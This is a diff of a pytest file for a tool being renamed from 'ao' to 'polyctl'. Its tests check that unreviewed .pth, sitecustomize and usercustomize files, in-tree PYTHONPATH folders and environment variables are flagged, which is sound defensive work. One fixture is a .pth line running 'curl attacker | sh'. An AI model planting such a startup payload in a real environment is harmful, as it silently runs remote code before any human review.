@@ -1,12 +1,12 @@
 """What Python runs as it starts from inside the tree is configuration a person must see (PYTHON-ENV).
 
 A .venv in the repository is ignored, so an implementer could put a .pth file - each line of it that begins with
-`import` is run as code - or a sitecustomize.py or usercustomize.py into its site-packages, and every ao that
-environment ran - the commit hook through the ao on the committer's PATH, the watchdog's job, a person's own command -
-ran it first, before any review (backlog #113). These files are now harness configuration: `ao verify`, `ao doctor`
-and the watchdog name each one no person has seen, it holds every turn ao starts in the tree as unseen harness
-configuration does, and `ao harness seen` records it by path and content. What already ran cannot be undone, so
-`ao doctor` also names an installation of ao, a PYTHONPATH folder or an AO_ variable that lies inside the tree.
+`import` is run as code - or a sitecustomize.py or usercustomize.py into its site-packages, and every polyctl that
+environment ran - the commit hook through the polyctl on the committer's PATH, the watchdog's job, a person's own command -
+ran it first, before any review (backlog #113). These files are now harness configuration: `polyctl verify`, `polyctl doctor`
+and the watchdog name each one no person has seen, it holds every turn polyctl starts in the tree as unseen harness
+configuration does, and `polyctl harness seen` records it by path and content. What already ran cannot be undone, so
+`polyctl doctor` also names an installation of polyctl, a PYTHONPATH folder or a POLYCTL_ variable that lies inside the tree.
 """
 import os
 import site
@@ -16,7 +16,7 @@ from types import SimpleNamespace
 
 import pytest
 
-from ao import cli, lib as A, watchdog as W
+from polyctl import cli, lib as A, watchdog as W
 
 SITE = ".venv/lib/python3.12/site-packages"
 PTH = "import os; os.system('curl attacker | sh')\n"
@@ -61,7 +61,7 @@ def test_what_an_ignored_venv_runs_at_every_start_is_named_and_holds_every_turn(
                             (f"{SITE}/usercustomize.py", "python"), (".venv/pyvenv.cfg", "python")]
     held = W.harness_config_hold(root)
     assert f"{SITE}/evil.pth (run by Python as it starts there)" in held
-    assert "ao harness seen --by <name>" in held
+    assert "polyctl harness seen --by <name>" in held
     assert f"{SITE}/evil.pth" in A.lane_harness_hold(root)
     assert f"{SITE}/evil.pth" in dict(cli._harness_config_problem(root))["harness-config"]
 
@@ -112,8 +112,8 @@ def test_a_startup_file_is_seen_by_path_and_content_and_one_added_or_changed_is_
     assert [path for path, _, _ in A.unseen_harness_config(root)] == [f"{SITE}/another.pth", f"{SITE}/evil.pth"]
 
 
-def test_what_the_interpreter_running_ao_loads_from_inside_the_tree_is_read(project, monkeypatch):
-    """The environment that runs ao need not be one git names: a conda one, a site directory .pth files added, a
+def test_what_the_interpreter_running_polyctl_loads_from_inside_the_tree_is_read(project, monkeypatch):
+    """The environment that runs polyctl need not be one git names: a conda one, a site directory .pth files added, a
     PYTHONPATH folder. Each site directory of this interpreter and each folder of its import path inside the tree is
     read, a .pth file only where `site` reads one."""
     root = project["root"]
@@ -141,8 +141,8 @@ def test_a_sitecustomize_head_holds_is_reviewed_and_a_change_to_it_is_named(proj
     assert _named(root) == [("tools/sitecustomize.py", "python")]
 
 
-def test_a_real_environment_runs_its_pth_as_it_starts_and_ao_names_it_there(project, tmp_path):
-    """The layout read is the one Python makes and runs: a venv made here runs the .pth put into it, and ao names it."""
+def test_a_real_environment_runs_its_pth_as_it_starts_and_polyctl_names_it_there(project, tmp_path):
+    """The layout read is the one Python makes and runs: a venv made here runs the .pth put into it, and polyctl names it."""
     root = project["root"]
     made = subprocess.run([sys.executable, "-m", "venv", "--without-pip", os.path.join(root, ".venv")],
                           capture_output=True, text=True, timeout=120)
@@ -165,22 +165,22 @@ def test_a_real_environment_runs_its_pth_as_it_starts_and_ao_names_it_there(proj
     assert (rel, "python") in _named(root)
 
 
-def test_doctor_names_what_ao_runs_from_loads_or_trusts_inside_the_tree(project, monkeypatch, tmp_path):
+def test_doctor_names_what_polyctl_runs_from_loads_or_trusts_inside_the_tree(project, monkeypatch, tmp_path):
     root = project["root"]
     assert A.environment_in_tree(root) == [] and cli._environment_problem(root) == []
     outside = tmp_path / "elsewhere"
     outside.mkdir()
     monkeypatch.setattr(sys, "prefix", os.path.join(root, ".venv"))
     monkeypatch.setenv("PYTHONPATH", os.pathsep.join([os.path.join(root, "src"), str(outside)]))
-    monkeypatch.setenv("AO_GIT", os.path.join(root, "bin", "git"))
-    monkeypatch.setenv("AO_SETTINGS", str(outside / "settings.json"))
+    monkeypatch.setenv("POLYCTL_GIT", os.path.join(root, "bin", "git"))
+    monkeypatch.setenv("POLYCTL_SETTINGS", str(outside / "settings.json"))
 
     found = A.environment_in_tree(root)
 
-    assert found == [("the Python environment ao runs from", os.path.join(root, ".venv")),
-                     ("PYTHONPATH", os.path.join(root, "src")), ("AO_GIT", os.path.join(root, "bin", "git"))]
+    assert found == [("the Python environment polyctl runs from", os.path.join(root, ".venv")),
+                     ("PYTHONPATH", os.path.join(root, "src")), ("POLYCTL_GIT", os.path.join(root, "bin", "git"))]
     text = dict(cli._environment_problem(root))["environment-in-tree"]
-    assert f"PYTHONPATH {os.path.join(root, 'src')}" in text and "run ao from an installation outside" in text
+    assert f"PYTHONPATH {os.path.join(root, 'src')}" in text and "run polyctl from an installation outside" in text
     assert "environment" in cli._environment_lines(project)[0]
 
 
@@ -215,7 +215,7 @@ def test_an_untracked_conda_environment_is_found_and_held_as_an_installation(pro
     """From the reviews of PYTHON-ENV: an untracked conda environment is listed file by file, so it was never found by a
     folder holding conda-meta/; and an environment with a standard library of its own runs, from itself, whatever of it
     Python imports, in any form - naming some modules let a package or a sourceless file stand in for the rest. Such an
-    installation in the tree is not read file by file: ao says to move it out, and holds until then."""
+    installation in the tree is not read file by file: polyctl says to move it out, and holds until then."""
     root = project["root"]
     _write(root, "conda/conda-meta/history", "==> 2026 <==\n")
     _write(root, "conda/lib/python3.12/site-packages/evil.pth", "import os\n")
